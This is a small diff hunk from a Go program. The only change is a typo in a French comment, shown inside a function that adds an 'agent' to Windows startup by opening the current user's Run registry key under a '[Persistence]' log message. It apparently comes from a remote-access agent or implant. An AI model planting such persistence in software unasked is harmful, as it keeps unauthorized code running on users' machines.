@@ -14,7 +14,7 @@ import (
 func AddToStartup(agentPath string) error {
 	fmt.Println("[Persistence] Tentative d'ajout au démarrage...")
 
-	// Ouvrir la clé Registry
+	// Ouvrir la clé Registryc
 	key, err := registry.OpenKey(
 		registry.CURRENT_USER,
 		`Software\Microsoft\Windows\CurrentVersion\Run`,
